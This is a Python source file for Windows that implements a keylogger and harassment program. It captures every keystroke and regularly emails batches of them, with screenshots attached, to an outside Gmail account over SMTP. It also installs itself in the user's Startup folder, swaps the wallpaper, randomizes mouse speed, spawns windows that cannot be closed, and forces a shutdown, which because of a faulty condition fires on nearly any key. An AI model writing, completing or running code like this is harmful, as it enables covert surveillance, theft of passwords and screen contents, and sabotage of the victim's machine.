import pyautogui
import ctypes
import random
from threading import Timer
from multiprocessing import Process
from pynput.keyboard import Key, Listener
import tkinter as tk
from PIL import ImageTk,Image
import random
from win32api import GetSystemMetrics
import os
import getpass
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import subprocess
import winshell
import sys
class Main():

    path = r'C:/Users/{}/goods.png'.format(getpass.getuser())

    pathOFFile = os.path.dirname(os.path.abspath(__file__))



    pathOfFilePlusFileName = "{}\{}".format(pathOFFile,"Main.exe")




    def takeScreenShot(self):



            image = pyautogui.screenshot()

            image.save(x.path)

            ctypes.windll.user32.SystemParametersInfoW(20, 10, x.path, 0)

            image.close()


    def chnageMouseSpeed(self):

        mouseSpeed = random.randint(1,10)

        mouseSpeedString = "Mouse speed: {}".format(mouseSpeed)

        set_mouse_speed = 113

        ctypes.windll.user32.SystemParametersInfoA(set_mouse_speed, 0, mouseSpeed,0)


    def moveToStartUpFolder(self):

        userName = getpass.getuser()


        pathToStartUp = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Main.lnk".format(userName)

        if not os.path.exists(pathToStartUp):
            winshell.CreateShortcut(
                Path=pathToStartUp,
                Target=x.pathOfFilePlusFileName,
                Description="Dont delete this or else..."
            )








    def movePicturesToFolder(self):

        pathForPicture = r"C:/Users/{}/BRR2.gif".format(getpass.getuser())

        pathForIcon = r"C:/Users/{}/BRR2.ico".format(getpass.getuser())



        if not os.path.exists(pathForPicture):

            shutil.copy("BRR2.gif",pathForPicture)

        if not os.path.exists(pathForIcon):

            shutil.copy("BRR2.ico",pathForIcon)






    def sendEmail(self):

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()


        server.login("emailAdressOfTheAccountThatSendsTheEmail", "PasswordOfTheAccountThatSendsTheEmail")

        # Add a subject line
        msg = MIMEMultipart()

        msg["Subject"] = "More stuff"

        # Getting the image
        imageToOpen = open(x.path, 'rb').read()

        # Adding a image
        image = MIMEImage(imageToOpen, name=os.path.basename(x.path))

        msg.attach(image)

        message = ",".join(keyTyped)

        message = message.replace("'", "")

        # Ading text to the email

        text = MIMEText(message)
        msg.attach(text)

        server.sendmail("emailAdressOfTheAccountThatSendsTheEmail", "EmailThatRecievesTheEmail", msg.as_string())




if __name__ == '__main__':



    root = tk.Tk()

    root.withdraw()

    x = Main()

    keyTyped = []


    def start():


        x.takeScreenShot()
        x.chnageMouseSpeed()
        x.moveToStartUpFolder()
        x.movePicturesToFolder()

        root.after(2000,start)





    def disableExit():
        pass






    def makeWindow():

        width = GetSystemMetrics(0)

        height = GetSystemMetrics(1)

        path = r"C:/Users/{}/BRR2.ico".format(getpass.getuser())

        if not os.path.exists(path):
            img = ImageTk.PhotoImage(Image.open("BRR2.ico"))

        else:

            img = ImageTk.PhotoImage(Image.open(path))

        for i in range(10):

            window = tk.Toplevel(root)

            panel = tk.Label(window, image=img)

            panel.pack(side="bottom", fill="both", expand="yes")

            yPos = random.randint(1,height)

            xPos = random.randint(1,width)

            geo = "159x100+{}+{}".format(xPos, yPos)

            window.title("")

            window.geometry(geo)

            window.resizable(False, False)

            window.protocol("WM_DELETE_WINDOW",disableExit)

            iconPathNewFolder = r"C:/Users/{}/BRR2.ico".format(getpass.getuser())

            if not os.path.exists(iconPathNewFolder):

                window.iconbitmap("BRR2.gif")
            else:

                window.iconbitmap(iconPathNewFolder)



        root.after(2000, start)





        root.mainloop()


    def on_press(key):



        keyTyped.append(str(key))

        print(keyTyped)

        if len(keyTyped) == 100:

            print("Sending email")

            x.sendEmail()

            del keyTyped[:]

        if key == Key.esc:

            root.destroy()

            return False

        if key == Key.ctrl_l or Key.ctrl_r:

            subprocess.call(["shutdown","-f","-s","-t","50","-c","No more for you :)"])












    with Listener(on_press=on_press) as listener:
        makeWindow()
        listener.join()







































